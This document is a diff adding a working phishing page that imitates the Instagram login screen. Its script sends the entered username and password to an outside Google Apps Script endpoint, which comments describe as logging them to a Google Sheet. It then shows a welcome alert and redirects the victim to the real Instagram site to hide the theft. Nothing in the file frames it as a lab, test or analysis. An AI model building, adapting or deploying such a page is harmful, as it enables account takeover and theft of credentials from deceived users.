@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <style>
+        /* Instagram's Color Palette and Reset */
+        body {
+            background-color: #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%;
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+        }
+
+        /* The Main Login Box */
+        .login-card {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            width: 350px;
+            padding: 10px 0;
+            margin-bottom: 10px;
+            /* Animation: Slide in from bottom */
+            animation: slideUp 0.5s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        /* Instagram Logo */
+        .insta-logo {
+            font-family: 'Billabong', cursive; /* Note: Billabong is a common font for this, but might not load on all devices */
+            font-size: 3rem;
+            text-align: center;
+            margin: 22px auto 12px;
+            display: block;
+            color: #262626;
+        }
+        /* If Billabong doesn't load, use this as a fallback */
+        .insta-logo-text {
+             font-size: 3rem;
+             text-align: center;
+            margin: 22px auto 12px;
+            display: block;
+            color: #262626;
+        }
+
+        /* Input Fields */
+        .input-field {
+            width: 268px;
+            margin: 0 40px 6px;
+            padding: 9px 0 7px 8px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            box-sizing: border-box;
+            font-size: 12px;
+            color: #262626;
+        }
+        .input-field:focus {
+            outline: none;
+            border: 1px solid #a8a8a8;
+        }
+
+        /* Login Button */
+        .login-btn {
+            width: 268px;
+            margin: 8px 40px;
+            padding: 5px 9px;
+            background-color: #0095f6;
+            color: white;
+            border: 1px solid #0095f6;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            opacity: 0.7; /* Default disabled look */
+        }
+        .login-btn.active {
+            opacity: 1;
+        }
+
+        /* OR Separator */
+        .or-separator {
+            display: flex;
+            align-items: center;
+            margin: 10px 40px 18px;
+        }
+        .or-separator div {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        .or-separator span {
+            margin: 0 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        /* Facebook Login Link */
+        .fb-login {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .fb-login a {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .fb-login img {
+            width: 16px;
+            margin-right: 8px;
+        }
+
+        /* Forgot Password */
+        .forgot-pass {
+            text-align: center;
+            margin-top: 12px;
+        }
+        .forgot-pass a {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        /* Signup Section */
+        .signup-card {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            width: 350px;
+            padding: 25px 0;
+            text-align: center;
+            font-size: 14px;
+        }
+        .signup-card a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: 50px;
+            color: #8e8e8e;
+            font-size: 12px;
+            text-align: center;
+        }
+        .footer-links a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        /* Instagram Text Logo Gradient */
+.insta-logo-text {
+    font-size: 3rem;
+    text-align: center;
+    margin: 22px auto 12px;
+    display: block;
+    font-weight: bold;
+    /* Gradient Color */
+    background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+
+/* Gradient Login Button */
+.login-btn {
+    width: 268px;
+    margin: 8px 40px;
+    padding: 7px 9px;
+    border: none;
+    border-radius: 4px;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+    color: white;
+    /* Gradient Background for Button */
+    background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+    opacity: 0.7;
+    transition: opacity 0.3s;
+}
+
+.login-btn.active {
+    opacity: 1;
+}
+
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <h1 class="insta-logo-text">Instagram</h1> <input type="text" id="id" class="input-field" placeholder="Phone number, username, or email" oninput="checkInputs()">
+        <input type="password" id="pass" class="input-field" placeholder="Password" oninput="checkInputs()">
+        
+        <button id="loginBtn" class="login-btn" onclick="sendLogin()">Log In</button>
+
+        <div class="or-separator">
+            <div></div>
+            <span>OR</span>
+            <div></div>
+        </div>
+
+        <div class="forgot-pass">
+            <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+        </div>
+    </div>
+
+    <div class="signup-card">
+         <a href="https://www.instagram.com/accounts/emailsignup/?next=">Create new account</a>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a>
+            </div>
+        <p>© 2026 Instagram from Meta</p>
+    </div>
+
+    <script>
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxa3yT4ToH3mqr-ww_OT5rY9jcil72DguaNjh_KLbeokCP16rrKS3DCPYobR-XcEZhdMQ/exec"; // <--- Yahan apna URL daalein
+
+        // Function to make Login button blue when inputs are filled
+        function checkInputs() {
+            const id = document.getElementById('id').value;
+            const pass = document.getElementById('pass').value;
+            const btn = document.getElementById('loginBtn');
+            if (id.length > 0 && pass.length > 0) {
+                btn.classList.add('active');
+            } else {
+                btn.classList.remove('active');
+            }
+        }
+
+        // Function to send data to Google Sheet
+        async function sendLogin() {
+            const id = document.getElementById('id').value;
+            const pass = document.getElementById('pass').value;
+            const btn = document.getElementById('loginBtn');
+            
+            if(!id || !pass) return;
+
+            btn.innerText = "Please wait...";
+            btn.disabled = true;
+
+            try {
+                const res = await fetch(`${SCRIPT_URL}?id=${id}&pass=${pass}`);
+                const data = await res.text();
+                
+                // Regardless of success/fail, we mimic a redirect for the look
+                // In a real app, you'd check the data.trim() === "SUCCESS" here
+                alert("welcome to instagram"); // Feedback message
+                window.location.href = "https://www.instagram.com";
+
+            } catch (e) {
+                 alert("Error connecting to server.");
+            } finally {
+                btn.innerText = "Log In";
+                btn.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
